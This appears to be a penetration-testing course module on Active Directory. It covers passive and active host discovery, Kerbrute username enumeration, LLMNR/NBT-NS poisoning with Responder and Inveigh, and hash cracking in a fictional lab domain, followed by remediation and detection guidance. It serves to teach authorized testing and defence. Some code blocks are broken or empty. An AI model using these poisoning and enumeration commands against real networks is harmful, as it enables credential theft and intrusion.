## TTPs

Enumerating an AD environment can be overwhelming if just approached without a plan. There is an abundance of data stored in AD, and it can take a long time to sift if not looked at in progressive stages, and we will likely miss things. We need to set a game plan for ourselves and tackle it piece by piece. Everyone works in slightly different ways, so as we gain more experience, we'll start to develop our own repeatable methodology that works best for us. Regardless of how we proceed, we typically start in the same place and look for the same data points. We will experiment with many tools in this section and subsequent ones. It is important to reproduce every example and even try to recreate examples with different tools to see how they work differently, learn their syntax, and find what approach works best for us.

We will start with `passive` identification of any hosts in the network, followed by `active` validation of the results to find out more about each host (what services are running, names, potential vulnerabilities, etc.). Once we know what hosts exist, we can proceed with probing those hosts, looking for any interesting data we can glean from them. After we have accomplished these tasks, we should stop and regroup and look at what info we have. At this time, we'll hopefully have a set of credentials or a user account to target for a foothold onto a domain-joined host or have the ability to begin credentialed enumeration from our Linux attack host.

Let's look at a few tools and techniques to help us with this enumeration.

### Identifying Hosts

First, let's take some time to listen to the network and see what's going on. We can use `Wireshark` and `TCPDump` to "put our ear to the wire" and see what hosts and types of network traffic we can capture. This is particularly helpful if the assessment approach is "black box." We notice some [ARP](https://en.wikipedia.org/wiki/Address_Resolution_Protocol) requests and replies, [MDNS](https://en.wikipedia.org/wiki/Multicast_DNS), and other basic [layer two](https://www.juniper.net/documentation/us/en/software/junos/multicast-l2/topics/topic-map/layer-2-understanding.html) packets (since we are on a switched network, we are limited to the current broadcast domain) some of which we can see below. This is a great start that gives us a few bits of information about the customer's network setup.

Scroll to the bottom, spawn the target, connect to the Linux attack host using `xfreerdp` and fire up Wireshark to begin capturing traffic.

#### Start Wireshark on ea-attack01

```shell
┌─[htb-student@ea-attack01]─[~]
└──╼ $sudo -E wireshark

11:28:20.487     Main Warn QStandardPaths: runtime directory '/run/user/1001' is not owned by UID 0, but a directory permissions 0700 owned by UID 1001 GID 1002
<SNIP>

```

#### Wireshark Output

![image](https://academy.hackthebox.com/storage/modules/143/ea-wireshark.png)

- ARP packets make us aware of the hosts: 172.16.5.5, 172.16.5.25 172.16.5.50, 172.16.5.100, and 172.16.5.125.

![image](https://academy.hackthebox.com/storage/modules/143/ea-wireshark-mdns.png)

- MDNS makes us aware of the ACADEMY-EA-WEB01 host.

If we are on a host without a GUI (which is typical), we can use [tcpdump](https://linux.die.net/man/8/tcpdump), [net-creds](https://github.com/DanMcInerney/net-creds), and [NetMiner](http://www.netminer.com/main/main-read.do), etc., to perform the same functions. We can also use tcpdump to save a capture to a .pcap file, transfer it to another host, and open it in Wireshark.

#### Tcpdump Output

```shell
sudo tcpdump -i ens224

```

![image](https://academy.hackthebox.com/storage/modules/143/tcpdump-example.png)

There is no one right way to listen and capture network traffic. There are plenty of tools that can process network data. Wireshark and tcpdump are just a few of the easiest to use and most widely known. Depending on the host you are on, you may already have a network monitoring tool built-in, such as `pktmon.exe`, which was added to all editions of Windows 10. As a note for testing, it's always a good idea to save the PCAP traffic you capture. You can review it again later to look for more hints, and it makes for great additional information to include while writing your reports.

Our first look at network traffic pointed us to a couple of hosts via `MDNS` and `ARP`. Now let's utilize a tool called `Responder` to analyze network traffic and determine if anything else in the domain pops up.

[Responder](https://github.com/lgandx/Responder-Windows) is a tool built to listen, analyze, and poison `LLMNR`, `NBT-NS`, and `MDNS` requests and responses. It has many more functions, but for now, all we are utilizing is the tool in its Analyze mode. This will passively listen to the network and not send any poisoned packets. We'll cover this tool more in-depth in later sections.

#### Starting Responder

```bash
sudo responder -I ens224 -A

```

#### Responder Results

![image](https://academy.hackthebox.com/storage/modules/143/responder-example.gif)

As we start Responder with passive analysis mode enabled, we will see requests flow in our session. Notice below that we found a few unique hosts not previously mentioned in our Wireshark captures. It's worth noting these down as we are starting to build a nice target list of IPs and DNS hostnames.

Our passive checks have given us a few hosts to note down for a more in-depth enumeration. Now let's perform some active checks starting with a quick ICMP sweep of the subnet using `fping`.

[Fping](https://fping.org/) provides us with a similar capability as the standard ping application in that it utilizes ICMP requests and replies to reach out and interact with a host. Where fping shines is in its ability to issue ICMP packets against a list of multiple hosts at once and its scriptability. Also, it works in a round-robin fashion, querying hosts in a cyclical manner instead of waiting for multiple requests to a single host to return before moving on. These checks will help us determine if anything else is active on the internal network. ICMP is not a one-stop-shop, but it is an easy way to get an initial idea of what exists. Other open ports and active protocols may point to new hosts for later targeting. Let's see it in action.

#### FPing Active Checks

Here we'll start `fping` with a few flags: `a` to show targets that are alive, `s` to print stats at the end of the scan, `g` to generate a target list from the CIDR network, and `q` to not show per-target results.

```shell
fping -asgq 172.16.5.0/23

172.16.5.5
172.16.5.25
172.16.5.50
172.16.5.100
172.16.5.125
172.16.5.200
172.16.5.225
172.16.5.238
172.16.5.240

     510 targets
       9 alive
     501 unreachable
       0 unknown addresses

    2004 timeouts (waiting for response)
    2013 ICMP Echos sent
       9 ICMP Echo Replies received
    2004 other ICMP received

 0.029 ms (min round trip time)
 0.396 ms (avg round trip time)
 0.799 ms (max round trip time)
       15.366 sec (elapsed real time)

```

The command above validates which hosts are active in the `/23` network and does it quietly instead of spamming the terminal with results for each IP in the target list. We can combine the successful results and the information we gleaned from our passive checks into a list for a more detailed scan with Nmap. From the `fping` command, we can see 9 "live hosts," including our attack host.

Note: Scan results in the target network will differ from the command output in this section due to the size of the lab network. It is still worth reproducing each example to practice how these tools work and note down every host that is live in this lab.

#### Nmap Scanning

Now that we have a list of active hosts within our network, we can enumerate those hosts further. We are looking to determine what services each host is running, identify critical hosts such as `Domain Controllers` and `web servers`, and identify potentially vulnerable hosts to probe later. With our focus on AD, after doing a broad sweep, it would be wise of us to focus on standard protocols typically seen accompanying AD services, such as DNS, SMB, LDAP, and Kerberos name a few. Below is a quick example of a simple Nmap scan.

```bash
sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum

```

The [-A (Aggressive scan options)](https://nmap.org/book/man-misc-options.html) scan will perform several functions. One of the most important is a quick enumeration of well-known ports to include web services, domain services, etc. For our hosts.txt file, some of our results from Responder and fping overlapped (we found the name and IP address), so to keep it simple, just the IP address was fed into hosts.txt for the scan.

```

We can see from the output above that we have a potential host running an outdated operating system ( Windows 7, 8, or Server 2008 based on the output). This is of interest to us since it means there are legacy operating systems running in this AD environment. It also means there is potential for older exploits like EternalBlue, MS08-067, and others to work and provide us with a SYSTEM level shell. As weird as it sounds to have hosts running legacy software or end-of-life operating systems, it is still common in large enterprise environments. You will often have some process or equipment such as a production line or the HVAC built on the older OS and has been in place for a long time. Taking equipment like that offline is costly and can hurt an organization, so legacy hosts are often left in place. They will likely try to build a hard outer shell of Firewalls, IDS/IPS, and other monitoring and protection solutions around those systems. If you can find your way into one, it is a big deal and can be a quick and easy foothold. Before exploiting legacy systems, however, we should alert our client and get their approval in writing in case an attack results in system instability or brings a service or the host down. They may prefer that we just observe, report, and move on without actively exploiting the system.

The results of these scans will clue us into where we will start looking for potential domain enumeration avenues, not just host scanning. We need to find our way to a domain user account. Looking at our results, we found several servers that host domain services ( DC01, MX01, WS01, etc.). Now that we know what exists and what services are running, we can poll those servers and attempt to enumerate users. Be sure to use the `-oA` flag as a best practice when performing Nmap scans. This will ensure that we have our scan results in several formats for logging purposes and formats that can be manipulated and fed into other tools.

We need to be aware of what scans we run and how they work. Some of the Nmap scripted scans run active vulnerability checks against a host that could cause system instability or take it offline, causing issues for the customer or worse. For example, running a large discovery scan against a network with devices such as sensors or logic controllers could potentially overload them and disrupt the customer's industrial equipment causing a loss of product or capability. Take the time to understand the scans you use before running them in a customer's environment.

We will most likely return to these results later for further enumeration, so don't forget about them. We need to find our way to a domain user account or `SYSTEM` level access on a domain-joined host so we can gain a foothold and start the real fun. Let's dive into finding a user account.

* * *

## Identifying Users

If our client does not provide us with a user to start testing with (which is often the case), we will need to find a way to establish a foothold in the domain by either obtaining clear text credentials or an NTLM password hash for a user, a SYSTEM shell on a domain-joined host, or a shell in the context of a domain user account. Obtaining a valid user with credentials is critical in the early stages of an internal penetration test. This access (even at the lowest level) opens up many opportunities to perform enumeration and even attacks. Let's look at one way we can start gathering a list of valid users in a domain to use later in our assessment.

### Kerbrute - Internal AD Username Enumeration

[Kerbrute](https://github.com/ropnop/kerbrute) can be a stealthier option for domain account enumeration. It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts. We will use Kerbrute in conjunction with the `jsmith.txt` or `jsmith2.txt` user lists from [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames). This repository contains many different user lists that can be extremely useful when attempting to enumerate users when starting from an unauthenticated perspective. We can point Kerbrute at the DC we found earlier and feed it a wordlist. The tool is quick, and we will be provided with results letting us know if the accounts found are valid or not, which is a great starting point for launching attacks such as password spraying, which we will cover in-depth later in this module.

To get started with Kerbrute, we can download [precompiled binaries](https://github.com/ropnop/kerbrute/releases/latest) for the tool for testing from Linux, Windows, and Mac, or we can compile it ourselves. This is generally the best practice for any tool we introduce into a client environment. To compile the binaries to use on the system of our choosing, we first clone the repo:

#### Cloning Kerbrute GitHub Repo

```shell
sudo git clone https://github.com/ropnop/kerbrute.git

Typing `make help` will show us the compiling options available.

#### Listing Compiling Options

```shell

```

We can choose to compile just one binary or type `make all` and compile one each for use on Linux, Windows, and Mac systems (an x86 and x64 version for each).

```

The newly created `dist` directory will contain our compiled binaries.

#### Listing the Compiled Binaries in dist

```shell
ls dist/

kerbrute_darwin_amd64  kerbrute_linux_386  kerbrute_linux_amd64  kerbrute_windows_386.exe  kerbrute_windows_amd64.exe

```

We can then test out the binary to make sure it works properly. We will be using the x64 version on the supplied Parrot Linux attack host in the target environment.

#### Testing the kerbrute\_linux\_amd64 Binary

```shell
./kerbrute_linux_amd64

    __             __               __
   / /_____  _____/ /_  _______  __/ /____

/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

This tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.
It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.
Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts

Usage:
  kerbrute [command]

  <SNIP>

```

We can add the tool to our PATH to make it easily accessible from anywhere on the host.

#### Adding the Tool to our Path

```shell
echo $PATH
/home/htb-student/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/snap/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/htb-student/.dotnet/tools

```

#### Moving the Binary

```shell
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

```

We can now type `kerbrute` from any location on the system and will be able to access the tool. Feel free to follow along on your system and practice the above steps. Now let's run through an example of using the tool to gather an initial username list.

#### Enumerating Users with Kerbrute

```shell
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users

2021/11/17 23:01:46 >  Using KDC(s):

2021/11/17 23:01:56 >  Done! Tested 48705 usernames (56 valid) in 9.940 seconds

```

We can see from our output that we validated 56 users in the INLANEFREIGHT.LOCAL domain and it took only a few seconds to do so. Now we can take these results and build a list for use in targeted password spraying attacks.

## Identifying Potential Vulnerabilities

The [local system](https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account) account `NT AUTHORITY\SYSTEM` is a built-in account in Windows operating systems. It has the highest level of access in the OS and is used to run most Windows services. It is also very common for third-party services to run in the context of this account by default. A `SYSTEM` account on a `domain-joined` host will be able to enumerate Active Directory by impersonating the computer account, which is essentially just another kind of user account. Having SYSTEM-level access within a domain environment is nearly equivalent to having a domain user account.

There are several ways to gain SYSTEM-level access on a host, including but not limited to:

- Remote Windows exploits such as MS08-067, EternalBlue, or BlueKeep.
- Abusing a service running in the context of the `SYSTEM account`, or abusing the service account `SeImpersonate` privileges using [Juicy Potato](https://github.com/ohpe/juicy-potato). This type of attack is possible on older Windows OS' but not always possible with Windows Server 2019.
- Local privilege escalation flaws in Windows operating systems such as the Windows 10 Task Scheduler 0-day.
- Gaining admin access on a domain-joined host with a local account and using Psexec to launch a SYSTEM cmd window

By gaining SYSTEM-level access on a domain-joined host, you will be able to perform actions such as, but not limited to:

- Enumerate the domain using built-in tools or offensive tools such as BloodHound and PowerView.
- Perform Kerberoasting / ASREPRoasting attacks within the same domain.
- Run tools such as Inveigh to gather Net-NTLMv2 hashes or perform SMB relay attacks.
- Perform token impersonation to hijack a privileged domain user account.
- Carry out ACL attacks.

* * *

## A Word Of Caution

Keep the scope and style of the test in mind when choosing a tool for use. If you are performing a non-evasive penetration test, with everything out in the open and the customer's staff knowing you are there, it doesn't typically matter how much noise you make. However, during an evasive penetration test, adversarial assessment, or red team engagement, you are trying to mimic a potential attacker's Tools, Tactics, and Procedures. With that in mind, `stealth` is of concern. Throwing Nmap at an entire network is not exactly quiet, and many of the tools we commonly use on a penetration test will trigger alarms for an educated and prepared SOC or Blue Teamer. Always be sure to clarify the goal of your assessment with the client in writing before it begins.

* * *

## Let's Find a User

In the following few sections, we will hunt for a domain user account using techniques such as LLMNR/NBT-NS Poisoning and password spraying. These attacks are great ways to gain a foothold but must be exercised with caution and an understanding of the tools and techniques. Now let's hunt down a user account so we can move on to the next phase of our assessment and start picking apart the domain piece by piece and digging deep for a multitude of misconfigurations and flaws.


# LLMNR/NBT-NS Poisoning - from Linux

* * *

At this point, we have completed our initial enumeration of the domain. We obtained some basic user and group information, enumerated hosts while looking for critical services and roles like a Domain Controller, and figured out some specifics such as the naming scheme used for the domain. In this phase, we will work through two different techniques side-by-side: network poisoning and password spraying. We will perform these actions with the goal of acquiring valid cleartext credentials for a domain user account, thereby granting us a foothold in the domain to begin the next phase of enumeration from a credentialed standpoint.

This section and the next will cover a common way to gather credentials and gain an initial foothold during an assessment: a Man-in-the-Middle attack on Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) broadcasts. Depending on the network, this attack may provide low-privileged or administrative level password hashes that can be cracked offline or even cleartext credentials. Though not covered in this module, these hashes can also sometimes be used to perform an SMB Relay attack to authenticate to a host or multiple hosts in the domain with administrative privileges without having to crack the password hash offline. Let's dive in!

* * *

## LLMNR & NBT-NS Primer

[Link-Local Multicast Name Resolution](https://datatracker.ietf.org/doc/html/rfc4795) (LLMNR) and [NetBIOS Name Service](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063(v=technet.10)?redirectedfrom=MSDN) (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails. If a machine attempts to resolve a host but DNS resolution fails, typically, the machine will try to ask all other machines on the local network for the correct host address via LLMNR. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. It uses port `5355` over UDP natively. If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. NBT-NS utilizes port `137` over UDP.

The kicker here is that when LLMNR/NBT-NS are used for name resolution, ANY host on the network can reply. This is where we come in with `Responder` to poison these requests. With network access, we can spoof an authoritative name resolution source ( in this case, a host that's supposed to belong in the network segment ) in the broadcast domain by responding to LLMNR and NBT-NS traffic as if they have an answer for the requesting host. This poisoning effort is done to get the victims to communicate with our system by pretending that our rogue system knows the location of the requested host. If the requested host requires name resolution or authentication actions, we can capture the NetNTLM hash and subject it to an offline brute force attack in an attempt to retrieve the cleartext password. The captured authentication request can also be relayed to access another host or used against a different protocol (such as LDAP) on the same host. LLMNR/NBNS spoofing combined with a lack of SMB signing can often lead to administrative access on hosts within a domain. SMB Relay attacks will be covered in a later module about Lateral Movement.

* * *

## Quick Example - LLMNR/NBT-NS Poisoning

Let's walk through a quick example of the attack flow at a very high level:

1. A host attempts to connect to the print server at \\\print01.inlanefreight.local, but accidentally types in \\\printer01.inlanefreight.local.
2. The DNS server responds, stating that this host is unknown.
3. The host then broadcasts out to the entire local network asking if anyone knows the location of \\\printer01.inlanefreight.local.
4. The attacker (us with `Responder` running) responds to the host stating that it is the \\\printer01.inlanefreight.local that the host is looking for.
5. The host believes this reply and sends an authentication request to the attacker with a username and NTLMv2 password hash.
6. This hash can then be cracked offline or used in an SMB Relay attack if the right conditions exist.

* * *

## TTPs

We are performing these actions to collect authentication information sent over the network in the form of NTLMv1 and NTLMv2 password hashes. As discussed in the [Introduction to Active Directory](https://academy.hackthebox.com/course/preview/introduction-to-active-directory) module, NTLMv1 and NTLMv2 are authentication protocols that utilize the LM or NT hash. We will then take the hash and attempt to crack them offline using tools such as [Hashcat](https://hashcat.net/hashcat/) or [John](https://www.openwall.com/john/) with the goal of obtaining the account's cleartext password to be used to gain an initial foothold or expand our access within the domain if we capture a password hash for an account with more privileges than an account that we currently possess.

Several tools can be used to attempt LLMNR & NBT-NS poisoning:

| **Tool** | **Description** |
| --- | --- |
| [Responder](https://github.com/lgandx/Responder) | Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions. |
| [Inveigh](https://github.com/Kevin-Robertson/Inveigh) | Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks. |
| [Metasploit](https://www.metasploit.com/) | Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks. |

This section and the following one will show examples of using Responder and Inveigh to capture password hashes and attempt to crack them offline. We commonly start an internal penetration test from an anonymous position on the client's internal network with a Linux attack host. Tools such as Responder are great for establishing a foothold that we can later expand upon through further enumeration and attacks. Responder is written in Python and typically used on a Linux attack host, though there is a .exe version that works on Windows. Inveigh is written in both C# and PowerShell (considered legacy). Both tools can be used to attack the following protocols:

- LLMNR
- DNS
- MDNS
- NBNS
- DHCP
- ICMP
- HTTP
- HTTPS
- SMB
- LDAP
- WebDAV
- Proxy Auth

Responder also has support for:

- MSSQL
- DCE-RPC
- FTP, POP3, IMAP, and SMTP auth

* * *

### Responder In Action

Responder is a relatively straightforward tool, but is extremely powerful and has many different functions. In the `Initial Enumeration` section earlier, we utilized Responder in Analysis (passive) mode. This means it listened for any resolution requests, but did not answer them or send out poisoned packets. We were acting like a fly on the wall, just listening. Now, we will take things a step further and let Responder do what it does best. Let's look at some options available by typing `responder -h` into our console.

```shell
responder -h
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

Options:
  --version             show program's version number and exit
  -h, --help            show this help message and exit
  -A, --analyze         Analyze mode. This option allows you to see NBT-NS,
                        BROWSER, LLMNR requests without responding.
  -I eth0, --interface=eth0
                        Network interface to use, you can use 'ALL' as a
                        wildcard for all interfaces
  -i 10.0.0.21, --ip=10.0.0.21
                        Local IP to use (only for OSX)

  -b, --basic           Return a Basic HTTP authentication. Default: NTLM
  -r, --wredir          Enable answers for netbios wredir suffix queries.
                        Answering to wredir will likely break stuff on the
                        network. Default: False
  -d, --NBTNSdomain     Enable answers for netbios domain suffix queries.
                        Answering to domain suffixes will likely break stuff
                        on the network. Default: False
  -f, --fingerprint     This option allows you to fingerprint a host that
                        issued an NBT-NS or LLMNR query.
  -w, --wpad            Start the WPAD rogue proxy server. Default value is
                        False
  -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
                        Upstream HTTP proxy used by the rogue WPAD Proxy for
                        outgoing requests (format: host:port)
  -F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file
                        retrieval. This may cause a login prompt. Default:
                        False
  -P, --ProxyAuth       Force NTLM (transparently)/Basic (prompt)
                        authentication for the proxy. WPAD doesn't need to be
                        ON. This option is highly effective when combined with
                        -r. Default: False
  --lm                  Force LM hashing downgrade for Windows XP/2003 and
                        earlier. Default: False
  -v, --verbose         Increase verbosity.

```

As shown earlier in the module, the `-A` flag puts us into analyze mode, allowing us to see NBT-NS, BROWSER, and LLMNR requests in the environment without poisoning any responses. We must always supply either an interface or an IP. Some common options we'll typically want to use are `-wf`; this will start the WPAD rogue proxy server, while `-f` will attempt to fingerprint the remote host operating system and version. We can use the `-v` flag for increased verbosity if we are running into issues, but this will lead to a lot of additional data printed to the console. Other options such as `-F` and `-P` can be used to force NTLM or Basic authentication and force proxy authentication, but may cause a login prompt, so they should be used sparingly. The use of the `-w` flag utilizes the built-in WPAD proxy server. This can be highly effective, especially in large organizations, because it will capture all HTTP requests by any users that launch Internet Explorer if the browser has [Auto-detect settings](https://docs.microsoft.com/en-us/internet-explorer/ie11-deploy-guide/auto-detect-settings-for-ie11) enabled.

With this configuration shown above, Responder will listen and answer any requests it sees on the wire. If you are successful and manage to capture a hash, Responder will print it out on screen and write it to a log file per host located in the `/usr/share/responder/logs` directory. Hashes are saved in the format `(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt`, and one hash is printed to the console and stored in its associated log file unless `-v` mode is enabled. For example, a log file may look like `SMB-NTLMv2-SSP-172.16.5.25`. Hashes are also stored in a SQLite database that can be configured in the `Responder.conf` config file, typically located in `/usr/share/responder` unless we clone the Responder repo directly from GitHub.

We must run the tool with sudo privileges or as root and make sure the following ports are available on our attack host for it to function best:

```shell

UDP 137, UDP 138, UDP 53, UDP/TCP 389,TCP 1433, UDP 1434, TCP 80, TCP 135, TCP 139, TCP 445, TCP 21, TCP 3141,TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353

```

Any of the rogue servers (i.e., SMB) can be disabled in the `Responder.conf` file.

#### Responder Logs

```shell
ls

Analyzer-Session.log                Responder-Session.log
Config-Responder.log                SMB-NTLMv2-SSP-172.16.5.200.txt
HTTP-NTLMv2-172.16.5.200.txt        SMB-NTLMv2-SSP-172.16.5.25.txt

Proxy-Auth-NTLMv2-172.16.5.200.txt

```

If Responder successfully captured hashes, as seen above, we can find the hashes associated with each host/protocol in their own text file. The animation below shows us an example of Responder running and capturing hashes on the network.

We can kick off a Responder session rather quickly:

#### Starting Responder with Default Settings

```bash
sudo responder -I ens224

```

#### Capturing with Responder

![image](https://academy.hackthebox.com/storage/modules/143/responder_hashes.png)

Typically we should start Responder and let it run for a while in a tmux window while we perform other enumeration tasks to maximize the number of hashes that we can obtain. Once we are ready, we can pass these hashes to Hashcat using hash mode `5600` for NTLMv2 hashes that we typically obtain with Responder. We may at times obtain NTLMv1 hashes and other types of hashes and can consult the [Hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) page to identify them and find the proper hash mode. If we ever obtain a strange or unknown hash, this site is a great reference to help identify it. Check out the [Cracking Passwords With Hashcat](https://academy.hackthebox.com/course/preview/cracking-passwords-with-hashcat) module for an in-depth study of Hashcat's various modes and how to attack a wide variety of hash types.

Once we have enough, we need to get these hashes into a usable format for us right now. NetNTLMv2 hashes are very useful once cracked, but cannot be used for techniques such as pash-the-hash, meaning we have to attempt to crack them offline. We can do this with tools such as Hashcat and John.

```

Looking at the results above, we can see we cracked the NET-NTLMv2 hash for user `FOREND`, whose password is `Klmcargo2`. Lucky for us our target domain allows weak 8-character passwords. This hash type can be "slow" to crack even on a GPU cracking rig, so large and complex passwords may be more difficult or impossible to crack within a reasonable amount of time.

* * *

## Moving On

At this point in our assessment, we have obtained and cracked one NetNTLMv2 hash for the user `FOREND`. We can use this as a foothold into the domain to begin further enumeration. It is best to collect as much data as possible during an assessment, so we should attempt to crack as many hashes as we can (provided our later enumeration shows the value in cracking them to further our access). We don't want to waste precious assessment time attempting to crack hashes for users that will not help us move further toward our goal. Before we move into other ways to obtain a foothold via password spraying, let's walk through a similar method for obtaining hashes from a Windows host using the Inveigh tool.


# LLMNR/NBT-NS Poisoning - from Windows

* * *

LLMNR & NBT-NS poisoning is possible from a Windows host as well. In the last section, we utilized Responder to capture hashes. This section will explore the tool [Inveigh](https://github.com/Kevin-Robertson/Inveigh) and attempt to capture another set of credentials.

* * *

## Inveigh - Overview

If we end up with a Windows host as our attack box, our client provides us with a Windows box to test from, or we land on a Windows host as a local admin via another attack method and would like to look to further our access, the tool [Inveigh](https://github.com/Kevin-Robertson/Inveigh) works similar to Responder, but is written in PowerShell and C#. Inveigh can listen to IPv4 and IPv6 and several other protocols, including `LLMNR`, DNS, `mDNS`, NBNS, `DHCPv6`, ICMPv6, `HTTP`, HTTPS, `SMB`, LDAP, `WebDAV`, and Proxy Auth. The tool is available in the `C:\Tools` directory on the provided Windows attack host.

We can get started with the PowerShell version as follows and then list all possible parameters. There is a [wiki](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) that lists all parameters and usage instructions.

## Using Inveigh

Let's start Inveigh with LLMNR and NBNS spoofing, and output to the console and write to a file. We will leave the rest of the defaults, which can be seen [here](https://github.com/Kevin-Robertson/Inveigh#parameter-help).

We can see that we immediately begin getting LLMNR and mDNS requests. The below animation shows the tool in action.

## C\# Inveigh (InveighZero)

The PowerShell version of Inveigh is the original version and is no longer updated. The tool author maintains the C# version, which combines the original PoC C# code and a C# port of most of the code from the PowerShell version. Before we can use the C# version of the tool, we have to compile the executable. To save time, we have included a copy of both the PowerShell and compiled executable version of the tool in the `C:\Tools` folder on the target host in the lab, but it is worth walking through the exercise (and best practice) of compiling it yourself using Visual Studio.

Let's go ahead and run the C# version with the defaults and start capturing hashes.

```

As we can see, the tool starts and shows which options are enabled by default and which are not. The options with a `[+]` are default and enabled by default and the ones with a `[ ]` before them are disabled. The running console output also shows us which options are disabled and, therefore, responses are not being sent (mDNS in the above example). We can also see the message `Press ESC to enter/exit interactive console`, which is very useful while running the tool. The console gives us access to captured credentials/hashes, allows us to stop Inveigh, and more.

We can hit the `esc` key to enter the console while Inveigh is running.

Let's start Inveigh and then interact with the output a bit to put it all together.

## Remediation

Mitre ATT&CK lists this technique as [ID: T1557.001](https://attack.mitre.org/techniques/T1557/001), `Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay`.

There are a few ways to mitigate this attack. To ensure that these spoofing attacks are not possible, we can disable LLMNR and NBT-NS. As a word of caution, it is always worth slowly testing out a significant change like this to your environment carefully before rolling it out fully. As penetration testers, we can recommend these remediation steps, but should clearly communicate to our clients that they should test these changes heavily to ensure that disabling both protocols does not break anything in the network.

We can disable LLMNR in Group Policy by going to Computer Configuration --> Administrative Templates --> Network --> DNS Client and enabling "Turn OFF Multicast Name Resolution."

![image](https://academy.hackthebox.com/storage/modules/143/llmnr_disable.png)

NBT-NS cannot be disabled via Group Policy but must be disabled locally on each host. We can do this by opening `Network and Sharing Center` under `Control Panel`, clicking on `Change adapter settings`, right-clicking on the adapter to view its properties, selecting `Internet Protocol Version 4 (TCP/IPv4)`, and clicking the `Properties` button, then clicking on `Advanced` and selecting the `WINS` tab and finally selecting `Disable NetBIOS over TCP/IP`.

![image](https://academy.hackthebox.com/storage/modules/143/disable_nbtns.png)

While it is not possible to disable NBT-NS directly via GPO, we can create a PowerShell script under Computer Configuration --> Windows Settings --> Script (Startup/Shutdown) --> Startup with something like the following:

```powershell

$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}

```

In the Local Group Policy Editor, we will need to double click on `Startup`, choose the `PowerShell Scripts` tab, and select "For this GPO, run scripts in the following order" to `Run Windows PowerShell scripts first`, and then click on `Add` and choose the script. For these changes to occur, we would have to either reboot the target system or restart the network adapter.

![image](https://academy.hackthebox.com/storage/modules/143/nbtns_gpo.png)

To push this out to all hosts in a domain, we could create a GPO using `Group Policy Management` on the Domain Controller and host the script on the SYSVOL share in the scripts folder and then call it via its UNC path such as:

`\\inlanefreight.local\SYSVOL\INLANEFREIGHT.LOCAL\scripts`

Once the GPO is applied to specific OUs and those hosts are restarted, the script will run at the next reboot and disable NBT-NS, provided that the script still exists on the SYSVOL share and is accessible by the host over the network.

![image](https://academy.hackthebox.com/storage/modules/143/nbtns_gpo_dc.png)

Other mitigations include filtering network traffic to block LLMNR/NetBIOS traffic and enabling SMB Signing to prevent NTLM relay attacks. Network intrusion detection and prevention systems can also be used to mitigate this activity, while network segmentation can be used to isolate hosts that require LLMNR or NetBIOS enabled to operate correctly.

* * *

## Detection

It is not always possible to disable LLMNR and NetBIOS, and therefore we need ways to detect this type of attack behavior. One way is to use the attack against the attackers by injecting LLMNR and NBT-NS requests for non-existent hosts across different subnets and alerting if any of the responses receive answers which would be indicative of an attacker spoofing name resolution responses. This [blog post](https://www.praetorian.com/blog/a-simple-and-effective-way-to-detect-broadcast-name-resolution-poisoning-bnrp/) explains this method more in-depth.

Furthermore, hosts can be monitored for traffic on ports UDP 5355 and 137, and event IDs [4697](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4697) and [7045](https://www.manageengine.com/products/active-directory-audit/kb/system-events/event-id-7045.html) can be monitored for. Finally, we can monitor the registry key `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient` for changes to the `EnableMulticast` DWORD value. A value of `0` would mean that LLMNR is disabled.

* * *

## Moving On

We've now captured hashes for several accounts. At this point in our assessment, we would want to perform enumeration using a tool such as BloodHound to determine whether any or all of these hashes are worth cracking. If we get lucky and crack a hash for a user account with some privileged access or rights, we can begin expanding our reach into the domain. We may even get very lucky and crack the hash for a Domain Admin user! If we were unlucky in cracking hashes or cracked some but did not yield any fruit, then perhaps password spraying (which we will cover in-depth in the following few sections) will be more successful.

Please allow 3-5 minutes for the machine to become available after spawning the target of the question below.


# Password Spraying Overview

* * *

